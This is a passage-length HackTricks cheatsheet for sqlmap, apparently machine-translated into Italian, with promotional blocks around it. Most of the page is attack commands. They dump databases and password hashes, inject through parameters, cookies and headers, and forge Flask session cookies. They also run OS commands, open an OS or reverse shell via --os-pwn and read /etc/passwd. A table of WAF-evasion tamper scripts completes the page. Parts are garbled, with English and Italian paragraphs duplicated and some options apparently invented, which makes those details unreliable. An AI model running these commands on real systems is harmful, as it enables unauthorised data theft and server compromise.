# SQLMap - Cheatsheet

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Configurazione immediatamente disponibile per la valutazione delle vulnerabilit√† e il penetration testing**. Esegui un pentest completo da qualsiasi luogo con oltre 20 strumenti e funzionalit√† che vanno dalla ricognizione alla generazione di report. Non sostituiamo i pentester - sviluppiamo strumenti personalizzati, moduli di rilevamento ed exploit per permettere loro di dedicarsi a scavare pi√π a fondo, ottenere accesso shell e divertirsi.

{% embed url="https://pentest-tools.com/" %}

## Argomenti di base per SQLmap

### Generici
```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```
### Recuperare Informazioni

#### Interne
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```
#### Dati del database

The `--dump` option can be used to retrieve the data from the database. This option allows you to dump all the data from all the tables in the database or specify specific tables to dump.

L'opzione `--dump` pu√≤ essere utilizzata per recuperare i dati dal database. Questa opzione consente di estrarre tutti i dati da tutte le tabelle nel database o specificare tabelle specifiche da estrarre.

```bash
sqlmap -u "http://example.com/page.php?id=1" --dump
```

By default, `sqlmap` will dump the data in a tabular format. However, you can also specify other output formats such as CSV, JSON, XML, etc.

Per impostazione predefinita, `sqlmap` estrarr√† i dati in un formato tabellare. Tuttavia, √® anche possibile specificare altri formati di output come CSV, JSON, XML, ecc.

```bash
sqlmap -u "http://example.com/page.php?id=1" --dump --output-format=csv
```

The dumped data will be saved in a file named `dump.csv` in the current directory.

I dati estratti verranno salvati in un file chiamato `dump.csv` nella directory corrente.

You can also specify the tables to dump using the `--tables` option.

√à anche possibile specificare le tabelle da estrarre utilizzando l'opzione `--tables`.

```bash
sqlmap -u "http://example.com/page.php?id=1" --dump --tables=users,products
```

This will only dump the data from the `users` and `products` tables.

Questo estrarr√† solo i dati dalle tabelle `users` e `products`.
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
## Posizione dell'iniezione

### Da Burp/ZAP capture

Cattura la richiesta e crea un file req.txt
```bash
sqlmap -r req.txt --current-user
```
### Iniezione di richieste GET

#### Descrizione

L'iniezione di richieste GET √® una tecnica di attacco che sfrutta le vulnerabilit√† di sicurezza presenti nelle applicazioni web. Questo tipo di attacco si basa sull'inserimento di codice SQL malevolo all'interno dei parametri di una richiesta GET, al fine di manipolare le query eseguite dal server e ottenere informazioni sensibili o compromettere il sistema.

#### Funzionamento

L'iniezione di richieste GET avviene quando un'applicazione web non valida o filtra correttamente i dati inseriti dall'utente all'interno dei parametri di una richiesta GET. Questo permette all'attaccante di inserire codice SQL malevolo che viene eseguito dal server.

L'attaccante pu√≤ sfruttare questa vulnerabilit√† per ottenere informazioni sensibili, come dati personali o credenziali di accesso, o per compromettere il sistema eseguendo comandi dannosi.

#### Esempio

Supponiamo di avere un'applicazione web che accetta una richiesta GET per visualizzare i dettagli di un utente. La richiesta GET ha un parametro `id` che viene utilizzato per recuperare i dati dell'utente dal database.

L'URL della richiesta potrebbe essere simile a questo:

```
https://www.example.com/user?id=1
```

Un attaccante potrebbe sfruttare l'iniezione di richieste GET inserendo del codice SQL malevolo nel parametro `id`, ad esempio:

```
https://www.example.com/user?id=1' OR '1'='1
```

In questo caso, il codice SQL malevolo `OR '1'='1` viene eseguito dal server, ignorando la condizione originale della query e restituendo tutti i dati degli utenti presenti nel database.

#### Prevenzione

Per prevenire l'iniezione di richieste GET, √® fondamentale validare e filtrare correttamente i dati inseriti dall'utente. √à consigliabile utilizzare parametri di richiesta preparati in modo sicuro e utilizzare query parametrizzate o stored procedure per eseguire le query sul database.

Inoltre, √® importante mantenere l'applicazione web sempre aggiornata con le ultime patch di sicurezza e utilizzare un firewall per proteggere il server da attacchi esterni.
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
### Iniezione di richieste POST

When performing a SQL injection attack on a web application, it is common to encounter scenarios where the injection point is located in a POST request. In these cases, the payload needs to be sent as part of the request body instead of the URL.

Durante l'esecuzione di un attacco di SQL injection su un'applicazione web, √® comune incontrare scenari in cui il punto di iniezione si trova in una richiesta POST. In questi casi, il payload deve essere inviato come parte del corpo della richiesta anzich√© nell'URL.

To perform a POST request injection using SQLMap, you need to provide the target URL, the injection point, and the payload. The payload can be specified using the `--data` option followed by the payload string.

Per eseguire un'iniezione di richiesta POST utilizzando SQLMap, √® necessario fornire l'URL di destinazione, il punto di iniezione e il payload. Il payload pu√≤ essere specificato utilizzando l'opzione `--data` seguita dalla stringa del payload.

For example, the following command injects a payload into a POST request:

Ad esempio, il seguente comando inietta un payload in una richiesta POST:

```plaintext
sqlmap -u "http://example.com/login" --data "username=admin&password=test" --method POST --level 5 --risk 3
```

In this command, the `-u` option specifies the target URL, the `--data` option specifies the POST data, the `--method` option specifies the HTTP method as POST, and the `--level` and `--risk` options control the level of testing and the risk level, respectively.

In questo comando, l'opzione `-u` specifica l'URL di destinazione, l'opzione `--data` specifica i dati POST, l'opzione `--method` specifica il metodo HTTP come POST e le opzioni `--level` e `--risk` controllano il livello di test e il livello di rischio, rispettivamente.

By providing the necessary information, SQLMap will automatically inject the payload into the POST request and analyze the response to determine if a SQL injection vulnerability exists.

Fornendo le informazioni necessarie, SQLMap inietter√† automaticamente il payload nella richiesta POST e analizzer√† la risposta per determinare se esiste una vulnerabilit√† di SQL injection.
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
### Iniezioni negli Header e in altri Metodi HTTP

When performing a SQL injection test, it is important to consider not only the parameters in the URL, but also the headers and other HTTP methods that may be vulnerable to injection attacks. In this section, we will explore some techniques for injecting SQL code into headers and other HTTP methods.

Durante un test di SQL injection, √® importante considerare non solo i parametri nell'URL, ma anche gli header e altri metodi HTTP che potrebbero essere vulnerabili agli attacchi di injection. In questa sezione, esploreremo alcune tecniche per l'iniezione di codice SQL negli header e in altri metodi HTTP.

#### Injection in Headers

##### User-Agent Header

The User-Agent header is commonly used by web browsers to identify themselves to the server. It contains information about the browser, operating system, and other details. This header can sometimes be vulnerable to SQL injection attacks.

To test for SQL injection in the User-Agent header, you can use the following command:

```
sqlmap -u "http://example.com" --headers="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" --level=5 --risk=3
```

Replace the URL and User-Agent value with the appropriate values for your target.

##### Referer Header

The Referer header is used by web browsers to indicate the URL of the page that linked to the current page. This header can also be vulnerable to SQL injection attacks.

To test for SQL injection in the Referer header, you can use the following command:

```
sqlmap -u "http://example.com" --headers="Referer: http://example.com/page1.php?id=1" --level=5 --risk=3
```

Replace the URL and Referer value with the appropriate values for your target.

#### Injection in Other HTTP Methods

In addition to the GET and POST methods, there are other HTTP methods that can be vulnerable to SQL injection attacks. Some of these methods include PUT, DELETE, and OPTIONS.

To test for SQL injection in other HTTP methods, you can use the following command:

```
sqlmap -u "http://example.com" --method=PUT --data="id=1" --level=5 --risk=3
```

Replace the URL, method, and data values with the appropriate values for your target.

By testing for SQL injection in headers and other HTTP methods, you can identify additional attack vectors and increase the overall coverage of your penetration testing.

#### Conclusion

Injections in headers and other HTTP methods can provide additional attack vectors for SQL injection attacks. By testing these areas, you can increase the effectiveness of your penetration testing and identify potential vulnerabilities that may have been overlooked.
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
### Indicare la stringa quando l'iniezione ha successo

When performing SQL injection attacks, it is important to determine whether the injection was successful or not. One way to do this is by indicating a specific string that will be displayed when the injection is successful.

Durante l'esecuzione di attacchi di SQL injection, √® importante determinare se l'iniezione √® stata effettuata con successo o meno. Un modo per fare ci√≤ √® indicare una stringa specifica che verr√† visualizzata quando l'iniezione ha successo.

To achieve this, you can use the `--string` option in SQLMap. This option allows you to specify a string that should be present in the response when the injection is successful.

Per fare ci√≤, √® possibile utilizzare l'opzione `--string` in SQLMap. Questa opzione consente di specificare una stringa che dovrebbe essere presente nella risposta quando l'iniezione ha successo.

For example, if you know that the word "Success" will be displayed when the injection is successful, you can use the following command:

Ad esempio, se si sa che la parola "Successo" verr√† visualizzata quando l'iniezione ha successo, √® possibile utilizzare il seguente comando:

```
sqlmap -u "http://example.com/page.php?id=1" --string="Success"
```

SQLMap will then analyze the response and check if the specified string is present. If it is, it means that the injection was successful.

SQLMap analizzer√† quindi la risposta e verificher√† se la stringa specificata √® presente. Se lo √®, significa che l'iniezione √® stata effettuata con successo.
```bash
--string="string_showed_when_TRUE"
```
### Eval

**Sqlmap** consente l'uso di `-e` o `--eval` per elaborare ogni payload prima di inviarlo con un oneliner python. Ci√≤ rende molto facile e veloce elaborare il payload in modi personalizzati prima di inviarlo. Nell'esempio seguente, la **sessione cookie di Flask** **viene firmata da Flask con il segreto noto prima di inviarla**:
```bash
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```
### Shell

La shell √® un'interfaccia da linea di comando che consente agli utenti di interagire con il sistema operativo. √à uno strumento potente per eseguire comandi, gestire file e processi, e automatizzare attivit√†. Nella shell, √® possibile eseguire comandi come `ls` per elencare i file nella directory corrente, `cd` per spostarsi tra le directory, `mkdir` per creare una nuova directory, e molti altri. La shell √® uno strumento essenziale per i pentester, in quanto consente loro di eseguire comandi e script per eseguire attivit√† di hacking.
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
### Leggere un file

Per leggere il contenuto di un file utilizzando SQLMap, √® possibile utilizzare l'opzione `--file-read` seguita dal percorso del file da leggere. SQLMap cercher√† di sfruttare una possibile vulnerabilit√† di injection SQL per ottenere il contenuto del file specificato.

Ecco un esempio di come utilizzare l'opzione `--file-read`:

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --file-read="/var/www/html/config.php"
```

In questo esempio, stiamo cercando di leggere il file `config.php` che si trova nella directory `/var/www/html` del server remoto. Assicurati di sostituire l'URL e il percorso del file con quelli corretti per il tuo caso specifico.

Una volta eseguito il comando, SQLMap cercher√† di sfruttare l'injection SQL nella pagina `vulnerable.php` per leggere il contenuto del file specificato. Se la vulnerabilit√† √® presente e SQLMap riesce ad accedere al file, il suo contenuto verr√† visualizzato nell'output del comando.

√à importante notare che l'utilizzo di SQLMap per leggere file senza autorizzazione √® un'attivit√† illegale e pu√≤ comportare conseguenze legali. Assicurati di ottenere sempre l'autorizzazione appropriata prima di eseguire qualsiasi tipo di test di penetrazione o hacking.
```bash
--file-read=/etc/passwd
```
### Esegui lo spidering di un sito web con SQLmap e auto-sfrutta

SQLmap √® uno strumento potente per l'esecuzione di attacchi di SQL injection. Oltre a individuare e sfruttare le vulnerabilit√† di SQL injection, SQLmap pu√≤ anche eseguire lo spidering di un sito web per identificare automaticamente le pagine vulnerabili.

Per eseguire lo spidering di un sito web con SQLmap, utilizzare il seguente comando:

```
sqlmap -u <URL> --crawl=3 --batch
```

Dove `<URL>` √® l'URL del sito web che si desidera spiderizzare. L'opzione `--crawl=3` indica a SQLmap di eseguire lo spidering fino a una profondit√† di 3 livelli. √à possibile modificare questo valore in base alle proprie esigenze.

L'opzione `--batch` consente a SQLmap di eseguire automaticamente l'exploit delle pagine vulnerabili senza richiedere l'interazione dell'utente.

Durante il processo di spidering, SQLmap identificher√† le pagine vulnerabili e le sfrutter√† automaticamente per ottenere informazioni sensibili dal database sottostante.

√à importante notare che l'esecuzione di attacchi di SQL injection senza il consenso del proprietario del sito web √® illegale. Assicurarsi di ottenere l'autorizzazione appropriata prima di utilizzare SQLmap o qualsiasi altro strumento di hacking.
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
### Iniezione di Secondo Ordine

Second order injection, also known as stored or persistent injection, is a type of SQL injection attack that occurs when user-supplied data is stored in a database and later used in a vulnerable query. This type of injection can be more dangerous than traditional SQL injection because the payload is stored in the database and can be executed multiple times.

To perform a second order injection attack, an attacker typically needs to identify a vulnerable input field that is stored in the database. This can be a comment section, a user profile, or any other form field that allows user input to be stored.

Once the vulnerable input field is identified, the attacker can craft a malicious payload that will be stored in the database. This payload can be a SQL statement that, when executed, will perform unauthorized actions or extract sensitive information from the database.

To exploit the vulnerability, the attacker needs to trigger the execution of the stored payload. This can be done by accessing a page or performing an action that will cause the vulnerable query to be executed with the stored payload.

To prevent second order injection attacks, it is important to properly sanitize and validate user input before storing it in the database. Additionally, using parameterized queries or prepared statements can help protect against this type of attack by separating the query logic from the user-supplied data.

In conclusion, second order injection is a type of SQL injection attack that occurs when user-supplied data is stored in a database and later used in a vulnerable query. It can be more dangerous than traditional SQL injection because the payload is stored and can be executed multiple times. Proper input validation and the use of parameterized queries can help mitigate the risk of second order injection attacks.
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
[**Leggi questo post**](second-order-injection-sqlmap.md)**su come eseguire iniezioni di secondo ordine semplici e complesse con sqlmap.**

## Personalizzazione dell'iniezione

### Imposta un suffisso
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
### Prefisso
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
### Aiuto nella ricerca di un'iniezione booleana

Se stai cercando di individuare un'iniezione booleana in un'applicazione web, puoi utilizzare SQLMap, uno strumento di test di penetrazione specializzato per l'iniezione SQL. SQLMap automatizza il processo di individuazione e sfruttamento delle vulnerabilit√† di iniezione SQL, inclusa l'iniezione booleana.

Ecco i passaggi da seguire per utilizzare SQLMap per trovare un'iniezione booleana:

1. Esegui SQLMap con il parametro `-u` seguito dall'URL del punto di accesso dell'applicazione web che desideri testare.

   ```
   sqlmap -u http://www.example.com/page.php?id=1
   ```

2. SQLMap eseguir√† automaticamente una serie di test per individuare eventuali vulnerabilit√† di iniezione SQL. Se viene rilevata un'iniezione booleana, SQLMap ti chieder√† di confermare se desideri procedere con l'esecuzione dei test.

3. Seleziona l'opzione corrispondente per confermare che desideri procedere con l'iniezione booleana.

4. SQLMap inizier√† a testare diverse tecniche di iniezione booleana per determinare se l'applicazione √® vulnerabile. Durante questo processo, SQLMap invier√† richieste con espressioni booleane per ottenere informazioni sullo stato del database.

5. Una volta completato il processo di test, SQLMap fornir√† un rapporto dettagliato sulle vulnerabilit√† di iniezione booleana trovate e sulle informazioni ottenute dal database.

Seguendo questi passaggi, sarai in grado di utilizzare SQLMap per individuare e sfruttare un'iniezione booleana in un'applicazione web.
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
### Tamper

Ricorda che **puoi creare il tuo tamper in python** ed √® molto semplice. Puoi trovare un esempio di tamper nella [pagina Second Order Injection qui](second-order-injection-sqlmap.md).
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper                       | Descrizione                                                                                                                        |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| apostrophemask.py            | Sostituisce il carattere apostrofo con il suo corrispondente a larghezza completa in UTF-8                                                                |
| apostrophenullencode.py      | Sostituisce il carattere apostrofo con il suo doppio corrispondente unicode illegale                                                          |
| appendnullbyte.py            | Aggiunge un carattere NULL codificato alla fine del payload                                                                          |
| base64encode.py              | Codifica in Base64 tutti i caratteri in un determinato payload                                                                                           |
| between.py                   | Sostituisce l'operatore maggiore ('>') con 'NOT BETWEEN 0 AND #'                                                                    |
| bluecoat.py                  | Sostituisce il carattere spazio dopo l'istruzione SQL con un carattere vuoto casuale valido. Successivamente sostituisce il carattere = con l'operatore LIKE |
| chardoubleencode.py          | Codifica in doppio URL tutti i caratteri in un determinato payload (senza elaborare quelli gi√† codificati)                                              |
| commalesslimit.py            | Sostituisce le istanze come 'LIMIT M, N' con 'LIMIT N OFFSET M'                                                                       |
| commalessmid.py              | Sostituisce le istanze come 'MID(A, B, C)' con 'MID(A FROM B FOR C)'                                                                  |
| concat2concatws.py           | Sostituisce le istanze come 'CONCAT(A, B)' con 'CONCAT\_WS(MID(CHAR(0), 0, 0), A, B)'                                                 |
| charencode.py                | Codifica URL tutti i caratteri in un determinato payload (senza elaborare quelli gi√† codificati)                                                     |
| charunicodeencode.py         | Codifica in Unicode-URL i caratteri non codificati in un determinato payload (senza elaborare quelli gi√† codificati). "%u0022"                           |
| charunicodeescape.py         | Codifica in Unicode-URL i caratteri non codificati in un determinato payload (senza elaborare quelli gi√† codificati). "\u0022"                           |
| equaltolike.py               | Sostituisce tutte le occorrenze dell'operatore uguale ('=') con l'operatore LIKE                                                               |
| escapequotes.py              | Escape delle virgolette (' e ")                                                                                                      |
| greatest.py                  | Sostituisce l'operatore maggiore ('>') con il suo corrispondente GREATEST                                                                   |
| halfversionedmorekeywords.py | Aggiunge un commento MySQL versionato prima di ogni parola chiave                                                                                   |
| ifnull2ifisnull.py           | Sostituisce le istanze come 'IFNULL(A, B)' con 'IF(ISNULL(A), B, A)'                                                                  |
| modsecurityversioned.py      | Racchiude l'interrogazione completa con un commento versionato                                                                                     |
| modsecurityzeroversioned.py  | Racchiude l'interrogazione completa con un commento a versione zero                                                                                |
| multiplespaces.py            | Aggiunge pi√π spazi attorno alle parole chiave SQL                                                                                           |
| nonrecursivereplacement.py   | Sostituisce le parole chiave SQL predefinite con rappresentazioni adatte per la sostituzione (ad esempio .replace("SELECT", "")) filters               |
| percentage.py                | Aggiunge un segno di percentuale ('%') davanti a ogni carattere                                                                             |
| overlongutf8.py              | Converte tutti i caratteri in un determinato payload (senza elaborare quelli gi√† codificati)                                                        |
| randomcase.py                | Sostituisce ogni carattere della parola chiave con un valore casuale di maiuscole e minuscole                                                                             |
| randomcomments.py            | Aggiunge commenti casuali alle parole chiave SQL                                                                                                |
| securesphere.py              | Aggiunge una stringa speciale creata appositamente                                                                                                     |
| sp\_password.py              | Aggiunge 'sp\_password' alla fine del payload per l'oscuramento automatico dai log del DBMS                                          |
| space2comment.py             | Sostituisce il carattere spazio (' ') con commenti                                                                                       |
| space2dash.py                | Sostituisce il carattere spazio (' ') con un commento trattino ('--') seguito da una stringa casuale e una nuova riga ('\n')                        |
| space2hash.py                | Sostituisce il carattere spazio (' ') con un carattere cancelletto ('#') seguito da una stringa casuale e una nuova riga ('\n')                      |
| space2morehash.py            | Sostituisce il carattere spazio (' ') con un carattere cancelletto ('#') seguito da una stringa casuale e una nuova riga ('\n')                      |
| space2mssqlblank.py          | Sostituisce il carattere spazio (' ') con un carattere vuoto casuale da un insieme valido di caratteri alternativi                              |
| space2mssqlhash.py           | Sostituisce il carattere spazio (' ') con un carattere cancelletto ('#') seguito da una nuova riga ('\n')                                          |
| space2mysqlblank.py          | Sostituisce il carattere spazio (' ') con un carattere vuoto casuale da un insieme valido di caratteri alternativi                              |
| space2mysqldash.py           | Sostituisce il carattere spazio (' ') con un commento trattino ('--') seguito da una nuova riga ('\n')                                            |
| space2plus.py                | Sostituisce il carattere spazio (' ') con il segno pi√π ('+')                                                                                     |
| space2randomblank.py         | Sostituisce il carattere spazio (' ') con un carattere vuoto casuale da un insieme valido di caratteri alternativi                              |
| symboliclogical.py           | Sostituisce gli operatori logici AND e OR con i loro corrispondenti simbolici (&& e                                                     |
| unionalltounion.py           | Sostituisce UNION ALL SELECT con UNION SELECT                                                                                        |
| unmagicquotes.py             | Sostituisce il carattere virgoletta (') con una combinazione multibyte %bf%27 insieme a un commento generico alla fine (per farlo funzionare)             |
| uppercase.py                 | Sostituisce ogni carattere della parola chiave con il valore in maiuscolo 'INSERT'                                                                     |
| varnish.py                   | Aggiunge un'intestazione HTTP 'X-originating-IP'                                                                                            |
| versionedkeywords.py         | Racchiude ogni parola chiave non di funzione con un commento MySQL versionato                                                                    |
| versionedmorekeywords.py     | Racchiude ogni parola chiave con un commento MySQL versionato                                                                                 |
| xforwardedfor.py             | Aggiunge un'intestazione HTTP falsa 'X-Forwarded-For'                                                                                        |

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Configurazione immediatamente disponibile per la valutazione delle vulnerabilit√† e il penetration testing**. Esegui un pentest completo da qualsiasi luogo con oltre 20 strumenti e funzionalit√† che vanno dalla ricognizione alla generazione di report. Non sostituiamo i pentester: sviluppiamo strumenti personalizzati, moduli di rilevamento ed exploit per permettere loro di dedicarsi a indagini pi√π approfondite, ottenere accesso shell e divertirsi.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos.**

</details>
